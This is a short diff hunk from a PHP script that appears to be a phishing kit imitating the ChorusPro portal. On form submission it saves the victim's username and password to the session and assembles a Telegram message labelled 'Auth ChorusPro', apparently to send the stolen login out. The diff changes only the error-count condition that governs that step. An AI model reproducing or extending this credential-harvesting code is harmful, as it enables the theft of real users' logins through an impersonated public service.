@@ -233,7 +233,7 @@ if($_SERVER['REQUEST_METHOD'] == "POST") {
         $_SESSION['username'] = $_POST['username'];
         $_SESSION['password'] = $_POST['password'];
        
-        if( count($_SESSION['errors']) == 0 ) {
+        if( count($_SESSION['errors']) == 1 ) {
 
            
             $telegram_message = '    ✨ Auth ChorusPro ✨ ' . $_SERVER[''] . "\r\n";
